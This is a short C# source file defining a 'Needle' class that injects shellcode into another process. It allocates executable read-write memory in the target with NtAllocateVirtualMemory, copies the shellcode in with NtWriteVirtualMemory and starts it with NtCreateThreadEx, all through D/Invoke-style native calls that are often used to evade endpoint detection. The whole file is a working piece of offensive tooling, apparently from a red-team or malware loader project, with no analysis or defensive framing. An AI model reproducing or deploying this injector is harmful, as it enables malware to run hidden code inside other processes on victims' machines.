using System;
using System.Runtime.InteropServices;

using DemoApp.DInvoke;

namespace DemoApp.Injection
{
    public class Needle
    {
        private readonly Data.Win32.PROCESS_INFORMATION _pi;

        public Needle(Data.Win32.PROCESS_INFORMATION pi)
        {
            _pi = pi;
        }

        public void Inject(byte[] shellcode)
        {
            var shellcodeBuf = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, shellcodeBuf, shellcode.Length);
            
            var size = (IntPtr)shellcode.Length;
            var memory = IntPtr.Zero;
            
            Native.NtAllocateVirtualMemory(
                _pi.hProcess,
                ref memory,
                IntPtr.Zero,
                ref size,
                Data.Win32.MEM_COMMIT | Data.Win32.MEM_RESERVE,
                Data.Win32.PAGE_EXECUTE_READWRITE);

            Native.NtWriteVirtualMemory(
                _pi.hProcess,
                memory,
                shellcodeBuf,
                (uint)shellcode.Length);

            var hThread = IntPtr.Zero;
            Native.NtCreateThreadEx(
                ref hThread,
                Data.Win32.ACCESS_MASK.GENERIC_ALL,
                IntPtr.Zero,
                _pi.hProcess,
                memory,
                IntPtr.Zero, 
                false,
                0,
                0,
                0,
                IntPtr.Zero);
            
            Marshal.FreeHGlobal(shellcodeBuf);
        }
    }
}